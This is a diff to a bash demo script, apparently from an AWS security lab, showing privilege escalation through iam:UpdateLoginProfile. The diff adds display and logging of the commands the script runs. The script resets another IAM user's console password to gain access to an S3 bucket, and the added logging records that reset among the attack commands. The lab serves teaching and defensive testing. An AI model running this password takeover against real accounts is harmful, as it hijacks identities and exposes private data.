@@ -3,13 +3,33 @@
 # Demo script for iam:UpdateLoginProfile privilege escalation to S3 bucket access
 # This script demonstrates how a user with UpdateLoginProfile permission can escalate to S3 bucket access
 
-set -e
+
+# Disable AWS CLI paging
+export AWS_PAGER=""
 
 # Colors for output
 RED='\033[0;31m'
 GREEN='\033[0;32m'
 YELLOW='\033[1;33m'
 NC='\033[0m' # No Color
+
+# Dim color for command display
+DIM='\033[2m'
+CYAN='\033[0;36m'
+
+# Track attack commands for summary
+ATTACK_COMMANDS=()
+
+# Display a command before executing it
+show_cmd() {
+    echo -e "${DIM}\$ $*${NC}"
+}
+
+# Display AND record an attack command
+show_attack_cmd() {
+    echo -e "\n${CYAN}\$ $*${NC}"
+    ATTACK_COMMANDS+=("$*")
+}
 
 # Configuration
 STARTING_USER="pl-prod-iam-006-to-bucket-starting-user"
@@ -58,6 +78,7 @@ NEW_PASSWORD="PathfindingLabs123!${RANDOM_SUFFIX}"  # New password with random s
 
 # Step 2: Verify starting user identity
 echo -e "${YELLOW}Step 2: Verifying identity as starting user${NC}"
+show_cmd aws sts get-caller-identity --query 'Arn' --output text
 CURRENT_USER=$(aws sts get-caller-identity --query 'Arn' --output text)
 echo "Current identity: $CURRENT_USER"
 
@@ -70,6 +91,7 @@ echo -e "${GREEN}✓ Verified starting user identity${NC}\n"
 
 # Step 3: Get account ID
 echo -e "${YELLOW}Step 3: Getting account ID${NC}"
+show_cmd aws sts get-caller-identity --query 'Account' --output text
 ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
 echo "Account ID: $ACCOUNT_ID"
 echo -e "${GREEN}✓ Retrieved account ID${NC}\n"
@@ -118,6 +140,7 @@ echo ""
 echo -e "${YELLOW}Step 5: Verifying bucket user has an existing login profile${NC}"
 echo "Checking for login profile for user: $BUCKET_USER"
 
+show_cmd aws iam get-login-profile --user-name $BUCKET_USER
 if aws iam get-login-profile --user-name $BUCKET_USER &> /dev/null; then
     echo -e "${GREEN}✓ Confirmed: Login profile exists for $BUCKET_USER${NC}"
     LOGIN_PROFILE_INFO=$(aws iam get-login-profile --user-name $BUCKET_USER --output json)
@@ -135,6 +158,7 @@ echo -e "${YELLOW}Step 6: Verifying we don't have S3 bucket access yet${NC}"
 echo "Target bucket: $TARGET_BUCKET"
 echo "Attempting to list bucket contents (should fail)..."
 
+show_cmd aws s3 ls s3://$TARGET_BUCKET
 if aws s3 ls s3://$TARGET_BUCKET &> /dev/null; then
     echo -e "${RED}⚠ Unexpectedly have bucket access already${NC}"
 else
@@ -152,11 +176,12 @@ if [ ! -z "$ORIGINAL_PASSWORD" ] && [ "$ORIGINAL_PASSWORD" != "null" ]; then
     echo "$ORIGINAL_PASSWORD" > /tmp/original_password_iam_006_bucket.txt
 fi
 
+show_attack_cmd aws iam update-login-profile --user-name $BUCKET_USER --password "$NEW_PASSWORD" --no-password-reset-required
 aws iam update-login-profile \
     --user-name $BUCKET_USER \
     --password "$NEW_PASSWORD" \
-    --no-password-reset-required 
-    
+    --no-password-reset-required
+
 
 if [ $? -eq 0 ]; then
     echo -e "${GREEN}✓ Successfully updated login profile!${NC}"
@@ -192,6 +217,14 @@ echo "3. Achieved: Access to sensitive S3 bucket"
 
 echo -e "\n${YELLOW}Attack Path:${NC}"
 echo "  $STARTING_USER → (UpdateLoginProfile) → $BUCKET_USER → S3 Bucket Access"
+
+if [ ${#ATTACK_COMMANDS[@]} -gt 0 ]; then
+    echo ""
+    echo -e "${YELLOW}Attack Commands:${NC}"
+    for cmd in "${ATTACK_COMMANDS[@]}"; do
+        echo -e "  ${CYAN}\$ ${cmd}${NC}"
+    done
+fi
 
 echo -e "\n${YELLOW}Attack Artifacts:${NC}"
 echo "- Password changed for user: $BUCKET_USER"
